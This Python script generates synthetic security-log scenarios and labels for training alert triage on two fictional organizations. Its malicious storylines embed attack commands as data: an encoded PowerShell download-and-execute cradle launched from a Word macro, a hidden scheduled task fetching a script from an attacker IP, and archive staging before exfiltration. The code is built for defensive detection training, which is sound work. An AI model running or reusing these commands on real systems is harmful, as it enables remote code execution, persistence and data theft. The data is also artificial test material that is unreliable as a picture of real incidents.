"""Generate the v2 TRAINING pool (T-scenarios) — never used for evaluation, never mixed with S01–S12.

    tools/cuga-agent/.venv/Scripts/python.exe 03_scenarios/make_tpool.py        # writes tpool/configs/*.yaml + *.meta.json

Two new fictional organizations (different names, hosts, users, domains, IPs, dates, context files)
× 5 lookalike pairs (auth, powershell, beacon, account, upload) × 2 classes × 3 variants = 60 scenarios.
Variants per archetype: v1 consequential gap, v2 NON-consequential gap (an unrelated host/source is
missing), v3 consequential gap with a shifted activity time. Labels follow the same PROTOCOL §1.4 rule
as v1 and are written into each meta (training only).
"""
import base64
import json
from copy import deepcopy
from pathlib import Path

import yaml

HERE = Path(__file__).resolve().parent
OUT = HERE / "tpool" / "configs"
OUT.mkdir(parents=True, exist_ok=True)


def enc(ps):
    return base64.b64encode(ps.encode("utf-16-le")).decode()


ORGS = {
    "harbor": dict(
        name="Harbor Dental Group", domain="harbor-dental.local", netbios="HARBOR-DENTAL", day="2026-10-20",
        mail="harbordental.com", net="10.30", ext_cidr="203.0.113.32/28", attacker="192.0.2.45",
        users=dict(staff1=("maria.lopez", "WS-MLOPEZ-01", "accountant"), staff2=("ben.carter", "WS-BCARTER-01", "analyst"),
                   admin=("omar.haddad", "WS-OHADDAD-01", "sysadmin"), helpdesk=("lucy.park", "WS-LPARK-01", "help_desk")),
        svc_backup="svc-bkp", svc_job="svc-claimsync", job="ClaimSync", backup_vendor="cobaltvault.net",
        backup_agent=r"C:\Program Files\CobaltVault\Agent\cvagent.exe", app="ChartMate Imaging",
        app_path=r"C:\Program Files\ChartMate\cmupdate.exe", app_domain="update.chartmate-imaging.com",
        typo_domain="update.chartmate-imaging.net", typo_path=r"AppData\Local\ChartMate\cmupdate.exe",
        share_domain="sendbox-files.io", patch_script=r"\\FILE-HD-01\IT\Deploy-Patches.ps1",
        temp_prefix="tmp.", contractor_group="Temp-Staff", rogue_account="it_helper",
        dc="DC-HD-01", file="FILE-HD-01", proxy="PROXY-HD-01"),
    "northwind": dict(
        name="Northwind Design Studio", domain="nwd.local", netbios="NWD", day="2026-10-27",
        mail="northwinddesign.com", net="10.40", ext_cidr="198.18.0.0/28", attacker="203.0.113.250",
        users=dict(staff1=("ivy.chen", "WS-ICHEN-01", "marketing"), staff2=("leo.martins", "WS-LMARTINS-01", "developer"),
                   admin=("sam.okafor", "WS-SOKAFOR-01", "sysadmin"), helpdesk=("nora.blake", "WS-NBLAKE-01", "help_desk")),
        svc_backup="svc-archive", svc_job="svc-render", job="RenderQueue", backup_vendor="stratosafe-backup.com",
        backup_agent=r"C:\Program Files\StratoSafe\stsync.exe", app="PixelForge Suite",
        app_path=r"C:\Program Files\PixelForge\pfupdater.exe", app_domain="updates.pixelforge-suite.com",
        typo_domain="updates.pixelforge-suite.co", typo_path=r"AppData\Roaming\PixelForge\pfupdater.exe",
        share_domain="quickshare-drop.net", patch_script=r"\\FILE-NWD-01\Admin\Apply-Updates.ps1",
        temp_prefix="ext.", contractor_group="Freelancers", rogue_account="sysmaint",
        dc="DC-NWD-01", file="FILE-NWD-01", proxy="PROXY-NWD-01"),
}


def ips(o):
    n = o["net"]
    u = o["users"]
    return {u["staff1"][1]: f"{n}.10.21", u["staff2"][1]: f"{n}.10.22", u["admin"][1]: f"{n}.10.23",
            u["helpdesk"][1]: f"{n}.10.24", o["dc"]: f"{n}.20.10", o["file"]: f"{n}.20.20", o["proxy"]: f"{n}.20.30"}


def environment(o):
    I = ips(o)
    U = o["users"]
    users = [{"username": un, "full_name": un.replace(".", " ").title(), "email": f"{un}@{o['mail']}", "persona": p,
              "primary_system": h, "groups": ["staff"] if k not in ("admin",) else ["it-admins", "domain-admins"],
              "enabled": True, "browsing_intensity": "normal" if k == "staff1" else "light"}
             for k, (un, h, p) in U.items()]
    ws = [{"hostname": h, "ip": I[h], "os": "Windows 11 Enterprise", "type": "workstation", "assigned_user": un,
           "services": ["dns-client", "termservice"]} for (un, h, p) in U.values()]
    return {
        "description": o["name"], "domain": o["domain"], "timezone": {"default": "UTC"},
        "proxy": {"mode": "explicit", "listener_port": 8080}, "users": users,
        "service_accounts": [o["svc_backup"], o["svc_job"]],
        "systems": ws + [
            {"hostname": o["dc"], "ip": I[o["dc"]], "os": "Windows Server 2022", "type": "domain_controller",
             "services": ["kerberos", "ldap", "dns"], "roles": ["domain_controller", "dns_server"]},
            {"hostname": o["file"], "ip": I[o["file"]], "os": "Windows Server 2022", "type": "server",
             "services": ["smb", "dns-client"], "roles": ["file_server"]},
            {"hostname": o["proxy"], "ip": I[o["proxy"]], "os": "Ubuntu 22.04 LTS", "type": "server",
             "services": ["squid", "dns-client"], "roles": ["forward_proxy"]}],
        "network": {"public_cidrs": [o["ext_cidr"]],
                    "segments": [{"name": "workstations", "cidr": f"{o['net']}.10.0/24", "exposure": "internal",
                                  "systems": [h for (_, h, _) in U.values()]},
                                 {"name": "servers", "cidr": f"{o['net']}.20.0/24", "exposure": "internal",
                                  "systems": [o["dc"], o["file"], o["proxy"]]}],
                    "sensors": [{"type": "network", "name": "core-span", "hostname": "ZEEK-CORE",
                                 "monitoring_segments": ["workstations", "servers"], "direction": "bidirectional",
                                 "placement": "span", "log_formats": ["zeek"]}]}}


def context(o):
    U = o["users"]
    return (f"Organization: {o['name']} (domain {o['netbios']} / {o['domain']}).\n"
            f"Hosts: workstations {U['staff1'][1]} ({U['staff1'][0]}), {U['staff2'][1]} ({U['staff2'][0]}), "
            f"{U['admin'][1]} ({U['admin'][0]}, IT administrator), {U['helpdesk'][1]} ({U['helpdesk'][0]}, help desk); servers "
            f"{o['dc']} (domain controller), {o['file']} (file server, scheduled jobs), {o['proxy']} (explicit web proxy, port 8080). "
            f"There is no VPN; remote administration is only done from {U['admin'][1]}.\n"
            f"Accounts: {U['admin'][0]} is the only IT administrator. {U['helpdesk'][0]} (help desk) can create domain accounts but is not an administrator. "
            f"Service accounts: {o['svc_backup']} (backup agent on {o['file']}) and {o['svc_job']} ({o['job']} job on {o['file']}, runs every minute and re-authenticates each run).\n"
            f"Change calendar for {o['day']}: the {o['svc_job']} password is scheduled to be rotated at 13:30 UTC; the {o['job']} job must then be updated manually. Workstation patching by IT is scheduled during business hours.\n"
            f"IT practices: {U['admin'][0]} patches workstations by remotely running {o['patch_script']} with PowerShell from {U['admin'][1]}. "
            f"The help desk creates temporary accounts named {o['temp_prefix']}<name>, added only to the {o['contractor_group']} group; temporary accounts never get administrator rights.\n"
            f"Approved software and services: Microsoft 365 / OneDrive; {o['backup_vendor']} offsite backup (agent {o['backup_agent']} on {o['file']}, uploads several hundred MB); "
            f"{o['app']} (updater {o['app_path']}) checks {o['app_domain']} about every 5 minutes. No other file-sharing, cloud-storage or remote-access services are approved.\n")


def E(eid, t, actor, sysname, act, events):
    return {"id": eid, "time": t, "actor": actor, "system": sysname, "activity": act, "events": events}


def stories(o, shift):
    """Returns {archetype: (class, pair, alert_category, focus, alert, storyline, cons_gap, noncons_gap)}."""
    U, I = o["users"], ips(o)
    s1, s1h = U["staff1"][0], U["staff1"][1]
    s2, s2h = U["staff2"][0], U["staff2"][1]
    ad, adh = U["admin"][0], U["admin"][1]
    hd, hdh = U["helpdesk"][0], U["helpdesk"][1]
    t = lambda m: f"+{m + shift}m"
    win = f"{o['day']} between 13:20 and 14:20 UTC"
    PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    gap_dcfile = {"sources": ["winsec", "sysmon"], "hosts": [o["dc"], o["file"]]}
    gap_ws = lambda h: {"sources": ["winsec", "sysmon"], "hosts": [h]}
    gap_ws_proxy = lambda h: {"sources": ["winsec", "sysmon", "proxy"], "hosts": [h, o["proxy"]]}
    gap_proxy = {"sources": ["proxy"], "hosts": ["*"]}
    gap_other_ws = {"sources": ["winsec", "sysmon"], "hosts": [hdh]}   # unrelated host
    S = {}
    S["spray"] = ("MALICIOUS", "auth", "auth_failures", {"hosts": [], "ips": [], "users": [s2]},
                  f"Authentication monitoring: repeated failed domain logons involving account {s2} around 13:40 UTC on {o['day']}. Review authentication activity {win} and decide whether it is malicious.",
                  [E("spray", t(40), s2, o["dc"], "Password spray; one account succeeds",
                     [{"type": "credential_spray", "source_ip": o["attacker"], "pattern": "spray", "target_accounts": [s1, s2, ad, hd],
                       "logon_type": 3, "interval": "20s", "count": 16, "success": {"account": s2, "after": 9}}])], gap_dcfile, gap_proxy)
    S["svc_rotation"] = ("BENIGN", "auth", "auth_failures", {"hosts": [], "ips": [], "users": [o["svc_job"]]},
                         f"Authentication monitoring: repeated failed domain logons involving account {o['svc_job']} around 13:40 UTC on {o['day']}. Review authentication activity {win} and decide whether it is malicious.",
                         [E("stale", t(31), o["svc_job"], o["file"], "Job retries with the pre-rotation password",
                            [{"type": "credential_spray", "source_ip": I[o["file"]], "pattern": "brute_force", "target_accounts": [o["svc_job"]],
                              "logon_type": 3, "interval": "60s", "count": 16, "jitter": 0.1}])], gap_dcfile, gap_proxy)
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/{o['netbios'].lower()}-it/tools/main/u.ps1')"
    S["macro_ps"] = ("MALICIOUS", "powershell", "endpoint_powershell", {"hosts": [s1h], "ips": [I[s1h]], "users": [s1]},
                     f"Help desk ticket: {s1} ({s1h}) reports that a PowerShell window briefly appeared around 13:40 UTC on {o['day']}. Review activity {win}.",
                     [E("logon", t(35), s1, s1h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                      E("macro", t(40), s1, s1h, "Macro launches encoded PowerShell cradle and rundll32",
                        [{"type": "process", "process_ref": "word", "process_name": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                          "command_line": rf'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\{s1}\Downloads\Statement.docm"'},
                         {"type": "process", "process_ref": "ps", "parent_ref": "word", "process_name": PS,
                          "command_line": "powershell.exe -nop -w hidden -enc " + enc(cradle)},
                         {"type": "connection", "dst_ip": "185.199.110.133", "dst_port": 443, "hostname": "raw.githubusercontent.com",
                          "service": "ssl", "orig_bytes": 1300, "resp_bytes": 52000},
                         {"type": "process", "parent_ref": "ps", "process_name": r"C:\Windows\System32\rundll32.exe",
                          "command_line": rf"rundll32.exe C:\Users\{s1}\AppData\Roaming\svchelper.dll,Init"}])], gap_ws(s1h), gap_other_ws)
    S["admin_patch"] = ("BENIGN", "powershell", "endpoint_powershell", {"hosts": [s1h], "ips": [I[s1h]], "users": [s1]},
                        S["macro_ps"][4],
                        [E("adm", t(38), ad, s1h, "Admin network logon for patching", [{"type": "logon", "logon_type": 3, "source_ip": I[adh]}]),
                         E("patch", t(40), ad, s1h, "Patch script runs; Windows Update download; wusa",
                           [{"type": "process", "process_ref": "ps", "process_name": PS,
                             "command_line": f"powershell.exe -NoProfile -ExecutionPolicy Bypass -File {o['patch_script']}"},
                            {"type": "connection", "dst_ip": "13.107.4.52", "dst_port": 443, "hostname": "download.windowsupdate.com",
                             "service": "ssl", "orig_bytes": 2900, "resp_bytes": 38800000},
                            {"type": "process", "parent_ref": "ps", "process_name": r"C:\Windows\System32\wusa.exe",
                             "command_line": r"wusa.exe C:\Windows\Temp\patches\windows11-kb5047001-x64.msu /quiet /norestart"}])], gap_ws(s1h), gap_other_ws)
    S["beacon"] = ("MALICIOUS", "beacon", "periodic_network", {"hosts": [s2h], "ips": [I[s2h]], "users": [s2]},
                   f"Network anomaly detection: {s2h} made periodic outbound HTTPS connections at roughly 5-minute intervals between 13:30 and 14:10 UTC on {o['day']}. Review activity {win} and decide whether it is malicious.",
                   [E("logon", t(25), s2, s2h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                    E("implant", t(36), s2, s2h, "Masquerading updater beacons to typosquat",
                      [{"type": "process", "process_name": rf"C:\Users\{s2}\{o['typo_path']}", "command_line": rf'"C:\Users\{s2}\{o["typo_path"]}" --background'},
                       {"type": "beacon", "dst_ip": "203.0.113.211", "dst_port": 443, "hostname": o["typo_domain"], "service": "ssl",
                        "interval": "5m", "duration": "30m", "jitter": 0.1}])], gap_ws_proxy(s2h), gap_other_ws)
    S["updater"] = ("BENIGN", "beacon", "periodic_network", {"hosts": [s2h], "ips": [I[s2h]], "users": [s2]}, S["beacon"][4],
                    [E("logon", t(25), s2, s2h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                     E("upd", t(36), s2, s2h, "Approved updater polls vendor",
                       [{"type": "process", "process_name": o["app_path"], "command_line": f'"{o["app_path"]}" --background'},
                        {"type": "beacon", "dst_ip": "203.0.113.160", "dst_port": 443, "hostname": o["app_domain"], "service": "ssl",
                         "interval": "5m", "duration": "30m", "jitter": 0.1}])], gap_ws_proxy(s2h), gap_other_ws)
    S["rogue_admin"] = ("MALICIOUS", "account", "account_creation", {"hosts": [s2h], "ips": [], "users": [o["rogue_account"]]},
                        f"Account management alert: a new account named {o['rogue_account']} was created around 13:42 UTC on {o['day']}. Review activity {win} and decide whether it is malicious.",
                        [E("rdp", t(38), ad, s2h, "RDP from external IP", [{"type": "rdp_session", "source_ip": o["attacker"]}]),
                         E("persist", t(42), ad, s2h, "Local admin + hidden PowerShell task",
                           [{"type": "account_created", "target_username": o["rogue_account"]},
                            {"type": "group_member_added", "group_name": "Administrators", "member_name": o["rogue_account"], "scope": "local"},
                            {"type": "scheduled_task_created", "task_name": r"\Microsoft\Windows\HealthCheck",
                             "task_content": "powershell.exe -nop -w hidden -enc " + enc(f"IEX (iwr http://{o['attacker']}/a.ps1)")}])],
                        gap_ws(s2h), gap_proxy)
    tmp = f"{o['temp_prefix']}rwong"
    S["helpdesk_temp"] = ("BENIGN", "account", "account_creation", {"hosts": [], "ips": [], "users": [tmp, hd]},
                          f"Account management alert: a new account named {tmp} was created around 13:42 UTC on {o['day']}. Review activity {win} and decide whether it is malicious.",
                          [E("logon", t(38), hd, o["dc"], "Help desk console session to DC", [{"type": "logon", "logon_type": 3, "source_ip": I[hdh]}]),
                           E("create", t(42), hd, o["dc"], "Creates temporary account in contractor group",
                             [{"type": "account_created", "target_username": tmp},
                              {"type": "group_member_added", "group_name": o["contractor_group"], "member_name": tmp, "scope": "global"}])],
                          {"sources": ["winsec", "sysmon"], "hosts": [o["dc"]]}, gap_proxy)
    S["exfil"] = ("MALICIOUS", "upload", "large_upload", {"hosts": [s1h], "ips": [I[s1h]], "users": [s1]},
                  f"Network monitoring flagged a large outbound transfer (tens of MB) from {s1h} around 13:46 UTC on {o['day']}. Review activity {win} and decide whether it is malicious.",
                  [E("logon", t(35), s1, s1h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                   E("stage", t(40), s1, s1h, "Stage archive of shared folder",
                     [{"type": "process", "process_name": PS,
                       "command_line": rf"powershell.exe -NoProfile -Command Compress-Archive -Path \\{o['file']}\Shared\Clients -DestinationPath C:\Users\{s1}\AppData\Local\Temp\c.zip -Force"}]),
                   E("exfil", t(46), s1, s1h, "Upload to unapproved file-sharing site",
                     [{"type": "connection", "dst_ip": "203.0.113.99", "dst_port": 443, "hostname": o["share_domain"], "service": "ssl",
                       "orig_bytes": 51000000, "resp_bytes": 8800}])], gap_ws_proxy(s1h), gap_other_ws)
    S["backup_upload"] = ("BENIGN", "upload", "large_upload", {"hosts": [o["file"]], "ips": [I[o["file"]]], "users": []},
                          f"Network monitoring flagged a large outbound transfer (hundreds of MB) from {o['file']} around 13:46 UTC on {o['day']}. Review activity {win} and decide whether it is malicious.",
                          [E("svc", t(44), o["svc_backup"], o["file"], "Task Scheduler starts the backup job", [{"type": "logon", "logon_type": 5}]),
                           E("bk", t(45), o["svc_backup"], o["file"], "Backup agent uploads to approved vendor",
                             [{"type": "process", "process_name": o["backup_agent"], "command_line": f'"{o["backup_agent"]}" --job Nightly --target https://ingest.{o["backup_vendor"]}'},
                              {"type": "connection", "dst_ip": "203.0.113.141", "dst_port": 443, "hostname": f"ingest.{o['backup_vendor']}",
                               "service": "ssl", "orig_bytes": 640000000, "resp_bytes": 39000}])],
                          {"sources": ["winsec", "sysmon", "proxy"], "hosts": [o["file"], o["proxy"]]}, gap_other_ws)
    return S


def manifest(gap, day):
    rows = []
    for s in ["winsec", "sysmon", "proxy", "zeek_conn", "zeek_dns", "zeek_ssl"]:
        if s in gap["sources"]:
            hosts = [h for h in gap["hosts"] if h != "*"] or ["all proxy clients"]
            if s != "proxy":
                hosts = [h for h in hosts if not h.startswith("PROXY")]
            else:
                hosts = [h for h in gap["hosts"] if h.startswith("PROXY")] or ["proxy"]
            for h in hosts:
                rows.append({"sensor": s, "host": h, "window": [f"{day}T13:30:00Z", f"{day}T14:10:00Z"],
                             "status": "not_collected", "reason": "log collection outage"})
            rows.append({"sensor": s, "host": "all other hosts, and the hosts above outside the listed window", "status": "ok"})
        else:
            rows.append({"sensor": s, "host": "all hosts", "status": "ok"})
    return {"sensors": rows}


def main():
    n = 0
    for oi, (okey, o) in enumerate(ORGS.items()):
        (OUT / f"env_{okey}.context.txt").write_text(context(o), encoding="utf-8")
        for v, (shift, gapkind) in enumerate([(0, "cons"), (2, "noncons"), (5, "cons")], 1):
            for ai, (arch, (cls, pair, cat, focus, alert, story, cgap, ngap)) in enumerate(stories(o, shift).items()):
                n += 1
                tid = f"T{n:03d}"
                gap = deepcopy(cgap if gapkind == "cons" else ngap)
                gap["window"] = [f"{o['day']}T13:30:00.000Z", f"{o['day']}T14:10:00.000Z"]
                gap["mechanism"] = "log collection outage"
                y = {"version": "1.0", "name": f"ev-{tid}", "description": f"Evidence Vacuum TRAINING scenario {tid} ({okey}, {arch}, v{v}).",
                     "environment": environment(o),
                     "time_window": {"start": f"{o['day']}T13:00:00Z", "duration": "2h", "warmup": "1h"},
                     "generation_seed": 7000 + n,
                     "baseline_activity": {"description": "Quiet afternoon", "intensity": "low", "variation": "low", "suspicious_noise": "low"},
                     "observation_profile": "complete", "storyline": story,
                     "output": {"logs": [{"format": f} for f in ["windows_event_security", "windows_event_sysmon", "zeek_conn", "zeek_dns", "zeek_ssl", "proxy_access"]],
                                "destination": f"out/{tid}", "compression": False}}
                (OUT / f"{tid}.yaml").write_text(yaml.safe_dump(y, sort_keys=False, width=1000), encoding="utf-8")
                cons = gapkind == "cons"
                labels = {c: ("INSUFFICIENT" if cons and c != "C1" else ("MALICIOUS_SUPPORTED" if cls == "MALICIOUS" else "BENIGN_SUPPORTED"))
                          for c in ("C1", "C2", "C3")}
                meta = {"scenario_id": tid, "pool": "T", "org": okey, "class": cls, "pair": pair, "archetype": arch, "variant": v,
                        "alert_category": cat, "gap_type": "consequential" if cons else "non-consequential", "seed": 7000 + n,
                        "alert_summary": alert, "window": [f"{o['day']}T13:20:00.000Z", f"{o['day']}T14:20:00.000Z"],
                        "focus": focus, "gap": gap, "coverage_manifest": manifest(gap, o["day"]),
                        "environment_context": f"tpool/configs/env_{okey}.context.txt", "labels": labels}
                (OUT / f"{tid}.meta.json").write_text(json.dumps(meta, indent=1), encoding="utf-8")
    print("wrote", n, "T-scenarios to", OUT)


if __name__ == "__main__":
    main()
